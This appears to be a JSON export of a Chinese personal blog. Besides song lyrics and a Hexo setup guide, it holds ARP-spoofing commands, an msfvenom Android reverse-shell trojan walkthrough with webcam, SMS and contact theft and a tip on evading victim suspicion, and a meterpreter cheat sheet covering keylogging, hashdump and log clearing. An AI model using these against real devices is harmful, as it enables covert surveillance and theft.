192.168.1.1\n\n\n\n提示：-i interface          指定要使用的接口。-c own|host|both      指定范围own|host|both（自己|主机|两者）。-t target             指定一台特定主机为ARP中毒（如果未指定，则为LAN上的所有主机）。-rhost                  指定您希望拦截数据包的主机（通常是本地网关）。\n\n\n&nbsp;\n二、开启流量转发使目标的IP流量经过我的网卡，进行IP流量转发，让目标主机正常上网：\n1.ARP欺骗之前先开启流量转发，使用echo 1 &gt; /proc/sys/net/ipv4/ip_forward2.使用命令：cat /proc/sys/net/ipv4/ip_forward,显示1表示成功开启转发功能，0表示未开启;3.另开一个窗口：arpspoof -i eth0 -t 192.168.1.201 192.168.1.1进行欺骗；4.若目标主机能正常上网，则流量转发成功，否则流量转发未成功；5.本机（虚拟机）就被靶机当成网关了（即实际网关和攻击主机的物理地址一样）\n\necho 1 > /proc/sys/net/ipv4/ip_forward\ncat /proc/sys/net/ipv4/ip_forward\narpspoof -i eth0 -t 192.168.1.201 192.168.1.1\n\n","thumbnail":"https://i.loli.net/2018/12/24/5c20cfbb00881.jpg","plink":"https://Directoree.github.io/post/ARP-Broken-network/"},{"title":"资源","date":"2018-11-19T10:23:24.000Z","updated":"2018-12-24T12:30:51.206Z","content":"&ensp; \n资源目录(点击相应资源会跳转哦)😜\n\n\n\n书籍\n提取码\n视频\n提取码\n\n\n\n\n安全牛 — Kali Linux渗透测试(转录)\nNumb1\n安全牛 — Kali Linux渗透测试(转录)\nNumb2\n\n\n算法设计与分析课件\nNumb3\nKali渗透培训课程-逆小战\nNumb4\n\n\n信息安全数学基础课件\nNumb5\nSQLMAP注入牛人讲解\nNumb6\n\n\nJava课件\nNumb7\nBurpsuite视频教程\nNumb8\n\n\nJava 2 核心技术，卷I：基础知识（原书第7版）\nNumb9\nBurpsuite渗透软件教程\nNumb10\n\n\nDreaming in Code\nNumb11\nWeb基础\nNumb12\n\n\n梦断代码\nNumb13\nWeb漏洞讲解\nNumb14\n\n\n\n","thumbnail":"https://i.loli.net/2018/12/24/5c20d176a2877.jpg","plink":"https://Directoree.github.io/post/Resourses/"},{"title":"叶雪如-《水星记》《体面》收藏版","date":"2018-11-18T09:31:15.000Z","updated":"2018-12-24T12:32:17.627Z","content":"《水星记》&emsp;Music Video&nbsp;《体面》&emsp;Music Video叶雪如&emsp;微博&emsp;唱吧&emsp;网易云音乐&nbsp;\n\n《水星记》作曲 : 郭顶作词 : 郭顶水星记 - 郭顶词：郭顶曲：郭顶COVER-叶雪如着迷于你眼睛银河有迹可循穿过时间的缝隙它依然真实地吸引我轨迹这瞬眼的光景最亲密的距离沿着你皮肤纹理 走过曲折手臂做个梦给你做个梦给你等到看你银色满际等到分不清季节更替才敢说沉溺还要多远才能进入你的心还要多久才能和你接近咫尺远近却无法靠近的那个人也等着和你相遇环游的行星怎么可以拥有你这瞬眼的光景最亲密的距离沿着你皮肤纹理走过曲折手臂做个梦给你做个梦给你等到看你银色满际等到分不清季节更替才敢说沉溺还要多远才能进入你的心还要多久才能和你接近咫尺远近却无法靠近的那个人也等着和你相遇环游的行星怎么可以拥有你还要多远才能进入你的心还要多久才能和你接近咫尺远近却无法靠近的那个人要怎么探寻要多么幸运才敢让你发觉你并不孤寂当我还可以再跟你飞行环游是无趣至少可以陪着你\n&nbsp;&nbsp;&nbsp;\n《体面》别堆砌怀念让剧情变得狗血深爱了多年又何必毁了经典都已成年不拖不欠浪费时间是我情愿像谢幕的演员眼看着灯光熄灭来不及再轰轰烈烈就保留告别的尊严我爱你不后悔也尊重故事结尾分手应该体面谁都不要说抱歉何来亏欠我敢给就敢心碎镜头前面是从前的我们在喝彩流着泪声嘶力竭离开也很体面才没辜负这些年爱得热烈认真付出的画面别让执念毁掉了昨天我爱过你利落干脆最熟悉的街主角却换了人演我哭到哽咽心再痛就当破茧来不及再轰轰烈烈就保留告别的尊严我爱你不后悔也尊重故事结尾分手应该体面谁都不要说抱歉何来亏欠我敢给就敢心碎镜头前面是从前的我们在喝彩流着泪声嘶力竭离开也很体面才没辜负这些年爱得热烈认真付出的画面别让执念毁掉了昨天我爱过你利落干脆再见不负遇见\n&nbsp;&nbsp;&nbsp;&nbsp;\n \n","thumbnail":"https://i.loli.net/2018/12/24/5c20d1cd1a154.jpg","plink":"https://Directoree.github.io/post/叶雪如-《水星记》《体面》收藏版/"},{"title":"薛之谦-《肆无忌惮》专辑","date":"2018-11-17T15:54:01.000Z","updated":"2019-01-13T06:56:23.329Z","content":"\n\n作曲 : 张洢豪作词 : 薛之谦角色精湛 主题略荒诞理由太短 是让人不安疑信参半 却无比期盼你的惯犯 圆满别让纠缠 显得 孤单你肆无忌惮 你急着闹翻用词刁钻 要观后感爱本是两端 要倾斜不难 要摧毁简单我顺其自然 我表现勇敢补缺填满 随意调侃爱会变习惯 维护者喜欢 自愈的快感理由丰满 角色越骨感染上情感 退让都不谈承载过半 还奋力纠缠你的预判 圆满我尽量延缓 胡闹狂欢你肆无忌惮 你急着闹翻用词刁钻 要观后感爱本是两端 要倾斜不难 要摧毁简单我违背自然 我表演勇敢宁缺勿滥 严加看管无用的手段 维护者习惯 让自己难堪最后的离散 请用词温暖制作人：张洢豪编曲： 张洢豪、Eric Juu木吉他：张洢豪电吉他：Derrick Sepnio钢琴：Eric JuuBass：Rayvaughn Covington鼓：Padget Nanton III合声：薛之谦人声录制：汝文博@BIG.J Studio乐器录制：Tsang Yat Lung@Non Sound Studio混音：赵靖@BIG.J Studio母带：全相彦@OK Mastering Studio\n&nbsp;&nbsp;&nbsp;&nbsp;\n","thumbnail":"https://i.loli.net/2018/12/24/5c20d25b14a7b.jpg","plink":"https://Directoree.github.io/post/薛之谦-《肆无忌惮》专辑/"},{"title":"薛之谦-《那是你离开了北京的生活》专辑","date":"2018-11-17T15:45:59.000Z","updated":"2019-01-13T06:55:07.313Z","content":"\n\n作曲 : 方毅作词 : 薛之谦试着留盏灯假装陪伴失眠的我窗口就有等待的效果已经习惯摆放好两人份的餐桌这样看上去就不寂寞那是你离开了北京的生活街上的人偶尔会模仿你小动作轻而易举就能将我击破那些承诺提起人是你 还是我那是你离开了北京的生活我以为我爱了 就会留下些什么 纪念那些曲折我们快乐的争吵的不舍的分分合合我还是撑着 不说 我应该平静的面对你离开了北京的生活是否有人在对街窥探我的生活督促我别过的不快乐一晃而过看不清的是你 还是我那是你离开了北京的生活我以为我疯了 你在提醒我什么 别再故意招惹那些爱过的 美好的 快乐的 不是施舍我还是撑着 不说 我可以平静的接受你离开了北京的生活我以为是规则 失去最爱的一个 才能记忆深刻那些 幼稚的 轻狂的 勇敢的 从此收着我还在羡慕什么 街上哭的那个你却无比希望他抱住另一个那是你离开了北京的生活制作人：方毅编曲：茶茶木吉他：郭一凡电吉他：劳国贤贝斯：韩阳鼓手：武勇恒和声：方毅和声设计：茶茶 方毅弦乐团：国际首席爱乐乐团弦乐监制：胡静成弦乐录音师：王小四弦乐录音室：金田录音棚乐器录音师：邢铜乐器录音室：55TEC Studio人声录音师：汝文博人声录音室：BIG.J Studio混音师：赵靖混音室：BIG.J Studio母带：全相彦@OK Mastering Studio\n&nbsp;&nbsp;&nbsp;&nbsp;\n","thumbnail":"https://i.loli.net/2018/12/24/5c20d277ddadc.jpg","plink":"https://Directoree.github.io/post/薛之谦-《那是你离开了北京的生活》专辑/"},{"title":"薛之谦-《怪咖》专辑","date":"2018-11-17T15:39:03.000Z","updated":"2019-01-13T06:55:27.333Z","content":"\n\n作曲 : 薛之谦作词 : 薛之谦你的改变 很难制止了我的取悦 也不是天生的熟练了 喜怒就合并了你的理由是星星点点的我尽量充当气氛营造者练就成了 无痛的角色再听多几次分开的话越致命越不正面回答感情里的怪咖 有铺垫就不尴尬所以要找个延期方法既平静还能突然挣扎我自愿作怪咖 就不怕被你笑话你的铺垫 零零散散的别去揭穿 话题制造者我记得 你也会不舍我偶尔取悦也会失手的搞笑的人变成做恶的我习惯了 无痛的货色再听多几次分开的话越致命越不正面回答感情里的怪咖 有铺垫就不尴尬所以要找个延期方法既平静还能突然挣扎我自愿作怪咖 就不怕被你笑话你还有几次分开的话新鲜感不佳词语匮乏感情里的怪咖 可手里也没筹码所以要找个缓冲方法直到有天我也放得下我不是个怪咖 是不计较的惩罚感情里的怪咖 再难过也笑着说吧\n&nbsp;&nbsp;&nbsp;&nbsp;\n","thumbnail":"https://i.loli.net/2018/12/24/5c20d20a00599.png","plink":"https://Directoree.github.io/post/薛之谦-《怪咖》专辑/"},{"title":"Metasploit之渗透安卓实战","date":"2018-11-17T14:19:50.000Z","updated":"2018-12-24T12:30:02.800Z","content":"&nbsp;&nbsp;\nMetasploit之渗透安卓实战&emsp;在之前的Metaspoloit使用中都是在Windows系统中，因为渗透的是Windows系统，所以选用了“windows/meterpreter/reverse_tcp”模块。而这里需要渗透安卓系统了，就选用“android/meterpreter/reverse_tcp”模块。那么对于kali-linux连接木马的方式还是和之前的一样，利用“exploit/multi/handler”并且，同样需要选用“windows/meterpreter/reverse_tcp”的PAYLOAD这里假设我的测试环境kali-linux：  192.168.2.146安卓模拟环境：192.168.2.107\n\n&nbsp;\n一、生成远程安卓木马msfconsolemsfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.2.146 LPORT=4444 R &gt; payload.apk\n\n\n\n命令解析：p 设置要使用的payloadLHOST 设置用来接收反弹连接的主机（kali-linux的IP）LPORT 设置用来接收反弹连接的端口（kali-linux的端口）R 设置文件格式Location 要保存的文件位置–&gt;/root/Desktop/是桌面，没有目录表示当前系统Home目录下PS：对于目前的安卓系统安全机制的考虑，因为没有签名证书可能导致无法安装或易被受害者识破那么，签名证书的制作可以查看参考文献资料\n\n\n&nbsp;\n二、开启metasploit，并且开启相关连接msfconsoleuse exploit/multi/handlerset PAYLOAD android/meterpreter/reverse_tcpset LHOST 192.168.2.146set LPORT 4444exploit\n\n&nbsp;\n三、meterpreter连接&emsp;安卓手机安装并且打开木马后会返回我们一个meterpreter连接,那么我们可以使用以下的一些常用的命令:\n\ncd               –&gt;目录切换，命令：cd /  切换到根目录search           –&gt;搜索文件，命令：search text.jpgdownload         –&gt;下载文件，命令：download test.jpgwebcam_list      –&gt;查看摄像头列表，因为手机都是前置和后置摄像头了webcam_snap      –&gt;拍照一张，需要选用前置或者后置摄像头，命令：webcam_snap -i 1webcam_stream    –&gt;开启摄像头视频监控，同上，命令：webcam_stream -i 1安卓系统相关命令：check_root       –&gt;查看当前安卓是否已经rootdump_calllog     –&gt;下载通话记录dump_contacts    –&gt;下载短信记录dump_sms         –&gt;下载通讯录geolocate        –&gt;利用谷歌地图定位（需要安装谷歌地图）\n\n&nbsp;&nbsp;&nbsp;&nbsp;\n","thumbnail":"https://i.loli.net/2018/12/24/5c20d1463f471.jpg","plink":"https://Directoree.github.io/post/Metasploit3/"},{"title":"Metasploit工具Meterpreter的命令速查表","date":"2018-11-17T11:37:44.000Z","updated":"2018-12-24T12:29:39.435Z","content":"&nbsp;&nbsp;\nmsfpayload反弹shell使用的一些命令集&nbsp;\n一、核心命令 – 帮助菜单\n\nbackground – 将当前会话移动到背景变成一个session，当再次使用时再用sessions -i ID调用bgkill – 杀死一个背景 meterpreter 脚本bglist – 提供所有正在运行的后台脚本的列表bgrun – 作为一个后台线程运行脚本channel – 显示活动频道close – 关闭通道exit – 终止 meterpreter 会话help – 帮助菜单interact – 与通道进行交互irb – 进入 Ruby 脚本模式migrate – 移动到一个指定的 PID 的活动进程quit – 终止 meterpreter 会话read – 从通道读取数据run – 执行以后它选定的 meterpreter 脚本use – 加载 meterpreter 的扩展write – 将数据写入到一个通道\n\n\n二、文件系统命令\n\ncat -读取并输出到标准输出文件的内容cd -更改目录对受害人del -删除文件对受害人download-从受害者系统文件下载edit-用 vim编辑文件getlwd -打印本地目录getwd -打印工作目录lcd -更改本地目录lpwd -打印本地目录ls -列出在当前目录中的文件列表mkdir -在受害者系统上的创建目录pwd -输出工作目录rm -删除文件rmdir -受害者系统上删除目录upload-从攻击者的系统往受害者系统上传文件\n\n\n三、网络命令\n\nportfwd -端口转发route -查看或修改受害者路由表\n\n\n四、系统命令\n\nclearav -清除了受害者的计算机上的事件日志drop_token -被盗的令牌execute-执行命令getpid -获取当前进程 ID (PID)getprivs -尽可能获取尽可能多的特权getuid -获取作为运行服务器的用户kill -终止指定 PID 的进程\nps -列出正在运行的进程reboot-重新启动受害人的计算机reg -与受害人的注册表进行交互rev2self -在受害者机器上调用 RevertToSelf()shell -在受害者计算机上打开一个shellshutdown-关闭了受害者的计算机steal_token -试图窃取指定的 (PID) 进程的令牌sysinfo -获取有关受害者计算机操作系统和名称等的详细信息\n\n\n五、用户界面命令\n\nenumdesktops -列出所有可访问台式机getdesktop -获取当前的 meterpreter 桌面idletime -检查长时间以来，受害者系统空闲进程keyscan_dump -键盘记录软件的内容转储keyscan_start -启动时与如 Word 或浏览器的进程相关联的键盘记录软件keyscan_stop -停止键盘记录软件screenshot-抓去 meterpreter 桌面的屏幕截图set_desktop -更改 meterpreter 桌面uictl -启用用户界面组件的一些控件\n\n\n六、特权升级命令\n\ngetsystem -获得系统管理员权限\n\n\n七、密码转储命令\n\nhashdump -抓去哈希密码 (SAM) 文件中的值\n\n\n八、Timestomp 命令\n\ntimestomp -操作修改，访问，并创建一个文件的属性\n\n\n&nbsp;&nbsp;&nbsp;\n","thumbnail":"https://i.loli.net/2018/12/24/5c20d130083b4.jpg","plink":"https://Directoree.github.io/post/Metasploit2/"},{"title":"薛之谦-《渡》专辑","date":"2018-11-17T05:38:00.000Z","updated":"2018-12-28T10:13:34.002Z","content":"&nbsp;\n《渡》专辑\n\n\n\n&nbsp;\n《动物世界》作曲 : 郭顶作词 : 薛之谦东打一下西戳一下动物未必需要尖牙示爱的方法有礼貌或是我管它要将情人一口吞下还要显得温文尔雅螳螂委屈的展示旧伤疤求偶时候一惊一乍因为害怕时常倒挂走投无路的情况下舍弃了尾巴如果不能将它同化就寄生于它 大不了一同腐化努力进化 笑动物世界都太假祖先 已磨去爪牙相爱相杀 一定有更好的办法攀比一下 谁先跪下不再进化 动物世界里都太傻为情表现到浮夸得到了你就该丢下 人性来不及粉刷所以啊 人总患孤寡麋鹿本来约在树下说好一起浪迹天涯系上铃铛还在往那个方向挣扎如果有只豺狼它英勇披上婚纱 同伴笑他读过童话别再进化 别让动物世界太假我们 该露出爪牙相爱相杀 别再想更好的办法优胜劣汰 自舔伤疤假装进化 拼命想和动物有差玩一出高贵优雅在人们腐烂的欲望下 兽性来不及抹杀算了吧 懒得去挣扎人类用沙 想捏出梦里通天塔为贪念不惜代价驾驭着昂贵的木马 巢穴一层层叠加最后啊 却一丝不挂 别害怕 我们都孤寡制作人：郭顶编曲/钢琴/贝斯：陈迪鼓：王斌弦乐：国际首席爱乐乐团第一小提琴：李朋 王大毛庞阔 张浩 杨爽 李曦 刘潇 高言 杨思宇 倪冰雪第二小提琴：简蓓 阎红 张晨迪 唐昕 侯宇红 张雷 徐文超中提琴：何辉 毕芳 武文豪 陈欣欣 王羽沛大提琴：张平 郎莹 陈俊杰 孙艺 邵鑫低音提琴：周旭 段然录音：汝文博 （Big J Studio. beijing.)混音：赵靖（Big J Studio. beijing.）母带：Tom Coyne （Sterlingsound NYC.）\n&nbsp;&nbsp;&nbsp;\n《暧昧》作曲 : 薛之谦作词 : 薛之谦反正现在的感情 都暧昧你大可不必为难 找般配付出过的人排队 谈体会趁年轻别害怕一个人睡可能是现在感情 太昂贵让付出真心的人 好狼狈还不如听首情歌 的机会 忘了谁感情像牛奶一杯 越甜越让人生畏都早有些防备 润色前的原味所以人们都拿起咖啡 把试探放在两人位距离感一对 就不必再赤裸相对反正现在的感情 都暧昧你大可不必为难 找般配付出过的人排队 谈体会弃之可惜 食而无味可能是现在感情 太珍贵让付出真心的人 好疲惫谁不曾用过卑微的词汇 想留住谁还贪恋着衣衫昂贵 却输给了廉价香水他先诱你入位 还刻意放低了分贝可感情越爱越妩媚 像烂掉的苹果一堆连基因都不对 还在意什么鱼腥味反正现在的感情 都暧昧你大可不必为难 找般配何必给自己沉迷 的机会不如用误会来结尾反正现在的我们 算暧昧我愿意给的感情 请浪费反正流过的眼泪 难收回就别再安慰看你入眠的侧脸 有多美和你丢下的一切 好匹配我还以为我能 多狼狈我自以为制作人：郑伟编曲：薛之谦 郑伟混音：郑伟大提琴：周润青女声：孟楠合音：薛之谦 张石狄录音：莫家伟母带：Chris Gehringer\n&nbsp;&nbsp;&nbsp;\n《像风一样》作词：薛之谦作曲：薛之谦我等的模样好不具象用皮肤感受你的流向你竟然能做到带走阳光我一味的跟随过了量像风一样你靠近云都下降你卷起千层海浪我躲也不躲往里闯你不就像风一样侵略时沙沙作响再宣布恢复晴朗就好像我们两个没爱过一样曲折的夕阳负责格挡让委屈的感官无法释放最近我的伤口没生长因为我躲在没风的地方像风一样你靠近云都下降你卷起千层海浪我躲也不躲往里闯你不就像风一样侵略时沙沙作响再宣布恢复晴朗就好像我们两个没爱过一样你像风一样触摸时温柔流淌席卷我所有抵抗不急着要我投降你不就像风一样掠夺时沙沙作响可惜我自投罗网你也就没什么可骄傲的地方和风一样你离开不声不响我喜欢这种收场看上去谁也不曾亏欠过对方制作人：薛之谦编曲：张宝宇 郑伟混音：郑伟合音：薛之谦鼓：褚伟明bass：宣一亨吉他：孙闻楠人声录制：莫家伟（上海广播大厦200studio）乐器录制：吴身宝（soundhub studio）母带制作：Ted Jensen\n&nbsp;&nbsp;&nbsp;\n《高尚》作曲 : 周以力作词 : 薛之谦Vocal录音室：江苏广电总台录音室乐器录音室：北京录顶技录音室乐器录音师：王晓海；鲍锐（鼓）混音工程师：鲍锐@录顶技Studio母带工程师：Friedemann Tishmeyer@Hambug Studio在阴郁的地方 积攒能量人交出了什么 能变个样奇形怪状 的人在生长我躲在人群中 头在晃刺破我的心脏 样本不算肮脏 别恐慌你看我虚荣模样 你该怎么补偿我多高尚 向自尊开了枪你同情的眼光 我特别的欣赏哀而不伤我多慌张 怕人闯入我围墙窥探五官不详 见我原本模样还能 模仿 任何形状越恶劣的情况 越要想象狼藏起反犬旁 像从了良张牙舞爪 的人在散谎愿形容我的词 别太荒唐贪念表现恰当 就像索要嫁妆 在情理上请当我孤芳自赏 还规矩条条框框我多高尚 向自尊开了枪​你异样的眼光 我特别的欣赏让人难忘我多风光 你别闯入我围墙你要什么真相 不就图个皮囊不如 让我 留在橱窗我多难忘 像秀色可餐的模样感谢你又打赏 你用词越恰当我越膨胀我的疯狂 连我自己都看不上阴里怪气的愿望 那屈辱的轻伤谁能给我 发个奖章我多向往 有个美丽的地方我最初的模样 没痛也不会痒能把赏赐 都烧光编曲：周以力大提琴：郎莹鼓：尹森贝斯：陈然然吉他：张凇\n&nbsp;&nbsp;&nbsp;\n《骆驼》作曲 : 郭顶作词 : 甘世佳是什么在召唤着我提醒我我懦弱过犹豫过若我能挣脱那绳索旁若无人见我来议论我我是骆驼没见过最美的沙漠井里的青蛙劝我别相信候鸟胡说我心里有片沙漠那里有很多骆驼不再寂寞会围绕着我陪我说说我心里有片沙漠点缀着森林湖泊雨季一过有我爱吃的小水果我终于挣脱了绳索从不曾这么自在过轻松过我决定找回骆驼的生活不要再跟着我再骑着我沿途云朵趁没人看见就降落提醒着我再往前就从没人出去过转眼就看见沙漠那里有没有骆驼在期待我它是否在哪偷偷看我明明就来到沙漠为何看不到骆驼是不是说我来的不是时候原来这就是沙漠本来就没有骆驼负责地说那什么是我什么是我全世界都是沙漠人心里住着骆驼你就当做 我根本没有来过 来过都怪我亲手杀了骆驼制作人：郭顶编曲：陈迪吉他：陈迪 郭顶贝斯：陈迪鼓：Hayato录音：汝文博 At Big J Studio混音：卢楠 At Megawave Studio BJ母带：Ryan Smith At Sterling Sound NYC\n&nbsp;&nbsp;&nbsp;\n《别》作曲 : 薛之谦作词 : 薛之谦别犹豫 别偶遇 别相遇别一个人去看喜剧别继续 别比喻 别治愈别让人看出你有多委屈别下雨 别下去 别多余别以为他还会为你淋雨别几句 就离去 别离去别让他听见你最后一句别坦白 别让故事精彩别不安 只是还有习惯别喜欢 我长期的勇敢别揭穿 我唯一的遗憾别允许 别也许 别参与别自己和自己过不去别一句 又一句 别造句别让人笑话你的遭遇别坦白 别让故事精彩别不安 只是还有习惯别喜欢 我长期的勇敢别揭穿 我唯一的遗憾别垄断 我想你的夜晚别刺穿 我包裹的不堪别交代 我爱你的病态多草率 除了你都不爱别犹豫 别偶遇 别相遇….制作人：郑伟编曲：郑伟混音：郑伟合音：薛之谦弦乐：上海piao音弦乐团人声录制：吴身宝（soundhub studio）弦乐录制：莫家伟（上海广播大厦200studio）母带：Chris Gehringer\n&nbsp;&nbsp;&nbsp;\n《火星人来过》作曲 : 韩星洲作词 : 薛之谦我在听新闻里面说 他们曾来过火星人的心脏靠左我们也曾听大人说 他没有管我他们一定看见什么过森林不在 动物减半人们拍照 留念那些 飞机残骸妻离子散 空袭灾难那些不敢 谈政治的 都去避难被遗弃的小孩 搀扶那颗炸弹他父母被人用枪指着头要答案若要停战 先要谈判这一片片 荒凉土地幕后到底谁管如果钢铁都燃起火看城市多折磨请你配合我 一起难过假如猿人没点起火我们回到那生活你是否救得回刚离群的我火星人来过火星人来过火星人救我火星人救我火星人救我火星人爱我其实我们也忏悔过借口都好说可以怪我心脏偏左有些领袖话音刚落也会很难过因为会议迟迟通不过舍利不在象牙贩卖人们认为贫穷可以卖掉小孩钻石太窄富人不爱还在楼顶挥霍那些仿真钱财反正这没战乱也没有什么天灾我管他谁让瘟疫艾滋继续泛滥这种心态还能表态毕竟这是个打字不用负责任的年代如果欲望都燃起火怎么自私怎么活请你举起手假装难过假如猿人没点起火我们回到那生活你是否劝得住开第一枪的我假如有第三次战火让地核接近我你别难过请抱紧我如果你不能说服我就请你瞄准我你听地球刚哭过地球刚哭过地球有话说地球好脆弱火星人救我火星人救我火星人来过…制作人 : 韩星洲编曲 : 韩星洲混音 : 赵靖\n&nbsp;&nbsp;&nbsp;\n《背过手》作曲 : 薛之谦作词 : 薛之谦花被人摘走心被虫吸走我一无所有错过盛开的时候皮被刀割走枝被鹿捡走树从不开口破土后哪来的自由无奈的请背过手 在缝里等野果成熟无辜的人松了手 反正那背负都雷同梦被人抢走字被人偷走别攥着拳头最多解开粒领扣风劝云别走海将河推走爱上就别低头骄傲的自作自受无奈的请背过手 在梦里等斑驳轻舟无辜的人松了手 反正那背负都雷同无奈了请放下手 等野草会出卖墙头无耻的人伸出手 跪多久能换来富有生劝死别走 魂被肉死守尽量别张口 满足狼的胃口等怂恿的烫了手等看懂的还我自由制作人：郑伟编曲：宋涛混音：赵靖 Big J Studio女声：莫宇微合音：薛之谦吉他：宋涛贝斯：韩阳鼓：武勇恒（贝贝）人声录制：莫家伟（上海广播大厦200studio）女声、合音录制：汝文博 Bjg J Studio吉他、贝斯录制：汝文博 Big J Studio鼓录制：李游 55Tec Studio母带制作：Chris Gehringer\n&nbsp;&nbsp;&nbsp;\n《渡》中文词：薛之谦原词曲：Torbjorn Brundtland，Svein Berge渡人去的夜 用稀有的火焰照亮了胆怯 燃尽我语言亏欠都是磁铁 也不能被降解都想赎去罪孽 再偷偷的怀念有人在妥协 有人拼命在狡辩人设太可怜 希望你谅解都在散播细节 肢体在蔓延都想要张新脸 骨肉别相连渡人去的夜 船离开了湖面过程很简洁 根本没人能幸免你会坠入深渊 还是不断盘旋别被渡人听见 你还有所留恋制作人：郑伟编曲：Torbjorn Brundtland， Svein Berge混音：郑伟合音：薛之谦人声录制：莫家伟（上海广播大厦200studio），吴身宝（soundhub studio）母带制作：Chris Gehringer\n&nbsp;&nbsp;&nbsp;\n《我害怕》作词：薛之谦作曲：薛之谦我害怕你的消息不经意被谁提起像曾贴着我耳边的气息我害怕某个旋律带我回某个场景你说如果雨停了我们就在一起我害怕某条街道有你留下的记号会自以为是你对我的需要\n我害怕那段旅行继续在我的梦里我还相信你说的离开的原因最近我表现的还可以最近你已走到了哪里别在意随便问问而已都怪我才学会了爱情\n我害怕整理行李我害怕关灯休息我害怕揉揉眼睛就错过了你我害怕人潮密集我害怕山川小溪我害怕我在附近却找不到你如果我掉入了海底是否你会有一丝感应别在意随便说说而已别有压力我只想见见你\n我害怕你的呼吸我害怕太近距离我害怕别人提到你的秘密\n编曲：张宝宇混音：郑伟合音：薛之谦吉他手：宋宇母带：郑伟录音：莫家伟录音棚：上海广播大厦200studio\n&nbsp;&nbsp;&nbsp;\n","thumbnail":"https://i.loli.net/2018/12/24/5c20d23bc81b5.jpg","plink":"https://Directoree.github.io/post/薛之谦-《渡》专辑/"},{"title":"薛之谦-《最好》专辑","date":"2018-11-17T05:15:55.000Z","updated":"2019-01-13T06:55:14.634Z","content":"\n\n作曲 : 林倛玉/郭顶作词 : 小寒/廖慧明/郭顶最好就这样能把你忘掉最好能不想还有多困扰这复杂的情绪向我奔跑由来已经太少 或者已经无药\n最好的都已经送你不要最好的朋友说我太无聊最好的方式也只能这样反正你不要了 都好说不清他比我适合 适合这种时刻\n还是他比我懂得更让你快乐也许没资格 也只能怀念了我懂 没有意外了或许他比较适合 适合这种值得他说他比我懂得更让你快乐最好 不要记得我\n最好的都已经送你不要最好的朋友说我太无聊最好的方式也只能这样反正你不要了 都好\n说不清他比我适合 适合这种时刻还是他比我懂得更让你快乐也许没资格 也只能怀念了我懂 没有意外了\n或许他比较适合 适合这种值得他说他比我懂得更让你快乐最好 不要记得最好 不要记得最好 不要记得我\n制作人：郭顶编曲：陈迪钢琴/贝斯/吉他：陈迪弦乐录音：国际首席爱乐乐团/Memory Time Studio,beijing鼓 : 钟健鼓录音: 于昊/Tweak Tone Labs（beijing）录音 : 刘灵/Big.J Studio, Beijing音频编辑 : 赵靖/郭顶混音: 赵靖/Big.J Studio, BeijingOC/OA ：小寒&amp;廖慧明&amp;郭顶(OA)/林倛玉*&amp;郭顶(OC)OP：Funkie Monkies Publishing Pte Ltd (Warner/Chappell Music Taiwan Ltd.)OP：北京享耳音乐文化有限公司SP：Warner/Chappell Music Publishing Agency (Beijing) Ltd.SP：北京享耳音乐文化有限公司母带工程师: 姜升熙 Seunghee Kang@SONIC KOREA MASTERING&nbsp;&nbsp;&nbsp;&nbsp;\n","thumbnail":"https://i.loli.net/2018/12/24/5c20d220c2147.jpg","plink":"https://Directoree.github.io/post/薛之谦-《最好》专辑/"},{"title":"Hexo+Github博客搭建终极大法","date":"2018-11-16T07:42:28.000Z","updated":"2019-02-28T04:19:33.714Z","content":"2019.2.26更新最近有同学、朋友问我详细的Hexo+Github Pages Blog搭建，加之我把我这几个月来的一些使用技巧和方法总结一下。为什么要今天来更新一下呢？因为26对我来说是个特别的日子…..\n边听边看吧😊\n\n\n\n一、 前言&emsp;很早之前就想到要拥有自己的一个个人博客，最初想到的是CSDN，除了会员，无奈广告太多。接着考虑过博客园，但是不太喜欢它的UI……最终经朋友推荐了Github博客。经过大致几个小时的Search关于Github博客有关的东西之后，发现里面的背景、字体、高亮代码等等的所有东西全部都可以DIY，对于一个喜欢美丽事物的我来说确实喜欢上了。好了，话不多说了，接下来谈谈建立这个博客的辛酸过程吧……\n\n\n要有一个良好的使用习惯，包括但不限于：\n\n写自己博客创建方法。博客搭建好后可以写写自己搭建过程中遇到的问题以及解决方法；\n解决报错信息。初次搭建博客的过程是很麻烦的，特别对于git的报错，或者是hexo安装过程遇到的一系列问题，我的建议是：将报错信息复制到Google或者百度找解决方法，或者将错误截图和原因告诉已经搭建好博客的人，请教他们是如何解决类似问题的；\n创建更新日志。为自己的博客写一个更新日志，内容可以包含：更新内容、时间、原因、目的、方法，以及更新过程中遇到的问题是怎样解决的，这个习惯非常好，以后能非常便捷地帮助自己了解到博客的变化，以及自身积累的一个过程；\n初始创建好博客文件夹后可以复制一份保留好，以便后续可能使用到(极大可能会使用)；\n站点目录下的_config文件可以多复制几份，但是要方便区分；……\n\n\n&emsp;最近我重新又搭建了一个博客，实现了一台电脑搭建多个博客并部署到远程Github仓库。但是这个过程也是非常痛苦的，因为网上的教程我几乎都试了，但是没有一个是成功的……下面我会分别谈谈搭建一个、多个博客的详细过程。前提是第一个博客博客要搭建好，其余的就非常简单了！ (。・∀・)ノ\n&emsp;\n二、 搭建第一个博客2.1 搭建方式\nHexo+Github、Jekyll+Github\n\n&emsp;至于使用哪一种方式，网上看了许多帖子、视频、博客……大部分是使用Hexo，后来自己网上找了许多原因，发现Hexo官网提供了非常丰富的主题和插件，加上好维护，最终我选择了Hexo来搭建。\n\n\n2.2 搭建需要的工具\n1. 安装node.js 2. 安装Git  3. 安装Hexo 4. 安装Hexo依赖 5. 安装代码编辑工具，推荐Sublime Text(官网下载)\n\n2.3 搭建过程步骤一、那就是先注册自己的Github账号了先看完下面文字再点击视频链接去注册。\n\n1.进入https://github.com/点击注册。注意事项：    1）一个用户名、邮箱只能注册一次；    2）Github会限制浏览器，推荐Chrome、Firefox；    3）邮箱验证，通过了才能继续下面事项。\n\n\n2.关于取名：    1）比如我的用户名是Treecatee,相应的仓库取名推荐为Treecatee.github.io，否则后续使用Treecatee.github.io在浏览器访问时报错404；那如果我非要取其他名可以么？可以的，比如我取名为Directoree.github.io，那么在浏览器输入应该为Treecatee/Directoree.github.io，这样就可以了，不过URL很长…..    2）GitHub Pages 建好后需要将Branch改为master，然后在下面接着选一个theme，不然会访问不了Treecatee.github.io\n\n&emsp;到Github官网注册账号，过程还是有些繁琐的，那就推荐到这个视频看看怎么注册吧…..Github注册账号视频（点我）。 \n\n\n步骤二、 安装node.js&emsp;官网下载node，或者使用淘宝镜像源下载。安装好了后到命令行试试是否成功安装了，方法：打开命令行（Win+R）,输入cmd，打开命令行后输入node -v，如果显示版本则安装成功，否则重新安装。  \n\n\n\n步骤三、 